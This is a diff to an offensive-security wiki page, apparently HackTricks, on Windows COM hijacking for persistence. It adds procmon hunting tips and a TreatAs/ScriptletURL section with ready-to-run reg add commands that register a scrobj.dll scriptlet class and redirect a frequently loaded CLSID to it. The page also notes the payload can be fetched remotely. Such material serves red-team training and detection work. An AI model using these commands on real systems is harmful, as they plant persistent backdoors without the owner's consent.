@@ -2,15 +2,22 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### Searching not existent COM components
+### Searching non-existent COM components
 
-As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistent mechanisms**. Using `procmon` it's easy to find searched COM registries that doesn't exist that an attacker could create to persist. Filters:
+As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistence mechanism**. Using `procmon` it's easy to find searched COM registries that don't exist yet and could be created by an attacker. Classic filters:
 
 - **RegOpenKey** operations.
 - where the _Result_ is **NAME NOT FOUND**.
 - and the _Path_ ends with **InprocServer32**.
 
-Once you have decided which not existent COM to impersonate execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._
+Useful variations during hunting:
+
+- Also look for missing **`LocalServer32`** keys. Some COM classes are out-of-process servers and will launch an attacker-controlled EXE instead of a DLL.
+- Search for **`TreatAs`** and **`ScriptletURL`** registry operations in addition to `InprocServer32`. Recent detection content and malware writeups keep calling these out because they are much rarer than normal COM registrations and therefore high-signal.
+- Copy the legitimate **`ThreadingModel`** from the original `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` when cloning a registration into HKCU. Using the wrong model often breaks activation and makes the hijack noisy.
+- On 64-bit systems inspect both 64-bit and 32-bit views (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` and `HKLM\Software\Classes\WOW6432Node`) because 32-bit applications may resolve a different COM registration.
+
+Once you have decided which non-existent COM to impersonate, execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._
 
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
@@ -76,9 +83,40 @@ PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
 
-Then, you can just create the HKCU entry and everytime the user logs in, your backdoor will be fired.
+Then, you can just create the HKCU entry and every time the user logs in, your backdoor will be fired.
 
 ---
+
+## COM TreatAs Hijacking + ScriptletURL
+
+`TreatAs` allows one CLSID to be emulated by another one. From an offensive perspective this means you can leave the original CLSID untouched, create a second per-user CLSID that points to `scrobj.dll`, and then redirect the real COM object to the malicious one with `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.
+
+This is useful when:
+
+- the target application already instantiates a stable CLSID at logon or on app start
+- you want a registry-only redirect instead of replacing the original `InprocServer32`
+- you want to execute a local or remote `.sct` scriptlet through the `ScriptletURL` value
+
+Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
+
+```cmd
+:: 1. Create a malicious per-user COM class backed by scrobj.dll
+reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
+reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f
+
+:: 2. Redirect a high-frequency CLSID to the malicious class
+reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
+```
+
+Notes:
+
+- `scrobj.dll` reads the `ScriptletURL` value and executes the referenced `.sct`, so you can keep the payload as a local file or pull it remotely over HTTP/HTTPS.
+- `TreatAs` is especially handy when the original COM registration is complete and stable in HKLM, because you only need a small per-user redirect instead of mirroring the entire tree.
+- For validation without waiting on the natural trigger, you can instantiate the fake ProgID/CLSID manually with `rundll32.exe -sta <ProgID-or-CLSID>` if the target class supports STA activation.
 
 ## COM TypeLib Hijacking (script: moniker persistence)
 
@@ -142,8 +180,8 @@ Notes
 
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
+- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
 
